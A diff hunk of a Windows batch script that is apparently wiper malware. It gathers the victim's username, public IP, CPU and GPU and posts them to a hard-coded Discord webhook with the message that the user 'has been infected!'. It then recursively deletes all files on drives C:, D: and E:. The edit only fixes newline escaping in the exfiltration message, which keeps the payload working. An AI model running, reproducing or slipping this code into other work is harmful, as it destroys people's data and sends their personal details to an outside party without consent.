@@ -4,7 +4,7 @@ curl icanhazip.com > ip & set /p ip=<ip
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^$"`) do set cpu=%%i
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
 endlocal
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%username% has been infected!\n\nInformation of User\n\n:bust_in_silhouette: Username : %username%\n:gear: IP : %ip%\n\nInformation of Computer\n\nCPU : %cpu%\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%username% has been infected!^\n^\nInformation of User^\n^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\nInformation of Computer^\n^\nCPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ
 if exist "C:\" (cd C:\ & del "*" /f /q /s & rd C:\ /s /q)
 if exist "D:\" (cd D:\ & del "*" /f /q /s & rd D:\ /s /q)
 if exist "E:\" (cd E:\ & del "*" /f /q /s & rd E:\ /s /q)
